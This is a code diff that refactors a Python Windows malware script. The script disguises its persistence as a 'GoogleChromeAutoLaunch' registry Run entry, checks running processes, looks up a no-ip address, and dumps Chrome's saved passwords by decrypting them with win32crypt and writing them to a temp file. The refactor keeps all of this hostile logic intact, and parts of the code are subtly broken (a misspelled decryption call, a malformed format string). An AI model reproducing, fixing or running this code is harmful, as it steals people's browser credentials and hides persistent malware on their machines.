@@ -19,7 +19,12 @@ TIME_SLEEP = 10
 TEMP_PATH = tempfile.gettempdir()
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 REG_NAME = "GoogleChromeAutoLaunch_992136610WEAD21312ESAD31312"
-REG_VALUE = '"' + TEMP_PATH + '\GoogleChromeAutoLaunch.exe' + '"' + ' --no-startup-window /prefetch:5'
+REG_VALUE = (
+    f'"{TEMP_PATH}'
+    + '\GoogleChromeAutoLaunch.exe'
+    + '"'
+    + ' --no-startup-window /prefetch:5'
+)
 def set_reg_key_value(REG_PATH, name, value):
     try: 
         registry_key = winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,_winreg.KEY_ALL_ACCESS)
@@ -40,13 +45,10 @@ def fire():
         except WindowsError:
             pass
 def run_after_close():
-    foundIT = False
-    runningProcess = []
-    for item in os.popen('tasklist').read().splitlines()[4:]:
-        runningProcess.append(item.split())
-    for item2 in runningProcess:
-        if "powershell.exe" in item2:
-            foundIT = True 
+    runningProcess = [
+        item.split() for item in os.popen('tasklist').read().splitlines()[4:]
+    ]
+    foundIT = any("powershell.exe" in item2 for item2 in runningProcess)
     if not foundIT:
         fire()
 def get_noip_ip_address():
@@ -73,19 +75,18 @@ def dump_google_password():
             pass
         else:
             data = cursor.fetchall()
-            GoogleAutoPassPath = TEMP_PATH + '//GoogleAutoPass'
-            passGoogle = open(GoogleAutoPassPath, 'w')
-            for result in data:
-                try:
-                    password = win32crypt.CryptoUnprotectedData(result[2], None, None, None, 0)[1]
-                except Exception:
-                    continue
-                if password:
+            GoogleAutoPassPath = f'{TEMP_PATH}//GoogleAutoPass'
+            with open(GoogleAutoPassPath, 'w') as passGoogle:
+                for result in data:
                     try:
-                        passGoogle.write("[+] URL: %s \n Username: %s \n Passwords: %s \n" (result[0], result[1], password))
+                        password = win32crypt.CryptoUnprotectedData(result[2], None, None, None, 0)[1]
                     except Exception:
-                        pass
-            passGoogle.close()
+                        continue
+                    if password:
+                        try:
+                            passGoogle.write("[+] URL: %s \n Username: %s \n Passwords: %s \n" (result[0], result[1], password))
+                        except Exception:
+                            pass
 fire() 
 time.sleep(12)
 set_reg_key_value(REG_PATH, REG_NAME, REG_VALUE)
